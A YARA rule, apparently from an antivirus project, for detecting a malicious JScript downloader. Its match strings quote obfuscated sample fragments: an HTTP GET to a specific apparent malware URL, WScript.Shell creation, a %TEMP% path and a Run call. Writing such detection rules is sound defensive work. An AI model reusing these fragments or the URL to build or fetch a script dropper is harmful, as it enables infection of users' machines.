rule sig_20160427_5067927a6cad55b3ec44d5d371763864 {
  meta:
    description = "datamaliciousorder - file 20160427_5067927a6cad55b3ec44d5d371763864.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "13be09da86d7bf87274cc7df1895f3f1d64e48d703a9f798e5a0f974eb3acd28"

  strings:
    $s1  = "IntcsAhdzk[SeykmUsuqv](\"G\" + \"ET\", \"http://onlinecrockpotrecipes.com/k2tspa\", false);" fullword ascii
    $s2  = "var YnlkqTlunj = function AgkumLuigp() {return BjbrlQegut[KrkhmDercr](\"WScript\"+\".Shell\");}(), KghosTmslh = 11;" fullword ascii
    $s3  = "function DoxyzTaoao() {return YnlkqTlunj[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"+\"MP%/\") + \"Fkhckms" ascii
    $s4  = "function DoxyzTaoao() {return YnlkqTlunj[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"+\"MP%/\") + \"Fkhckms" ascii
    $s5  = "function KbhrhCjcus(HnlobFuqsk, WqixuDqlqq){PxcmzOykyh = PxcmzOykyh * 1; return HnlobFuqsk - WqixuDqlqq;};" fullword ascii
    $s6  = "var BjbrlQegut = this[\"WScript\"];" fullword ascii
    $s7  = "function FxgwjHbrko(){return UxgtrBpsoy + \"\";};" fullword ascii
    $s8  = "if (IntcsAhdzk[\"r\"+\"eadystate\"] < 2 * 2) continue;" fullword ascii
    $s9  = "function XvpjtDgxyf() {return ((LcheoDncfr == true) && (LcheoDncfr == OilngEbqkx)) ? 1 : PxcmzOykyh;};" fullword ascii
    $s10 = "var OilngEbqkx = false;" fullword ascii
    $s11 = "function FdjpvJdbqq()" fullword ascii
    $s12 = "function EyqyrUaixr(){return 23;};" fullword ascii
    $s13 = "LcheoDncfr = true; " fullword ascii
    $s14 = "function QmxabBkusb(){return KrkhmDercr;};" fullword ascii
    $s15 = "return KbhrhCjcus(ZssheXyogx, DeqbtKbhbk);" fullword ascii
    $s16 = "var LcheoDncfr = false;" fullword ascii
    $s17 = "OilngEbqkx = true; " fullword ascii
    $s18 = "function VjpylQpnxw(ShevsJzrcq){YnlkqTlunj[\"R\"+\"un\"](ShevsJzrcq, PxcmzOykyh, PxcmzOykyh);};" fullword ascii
    $s19 = "}while (BkzvgYvfxs);" fullword ascii
    $s20 = "var VosbsNbkjg = new this[\"D\"+\"ate\"]();" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}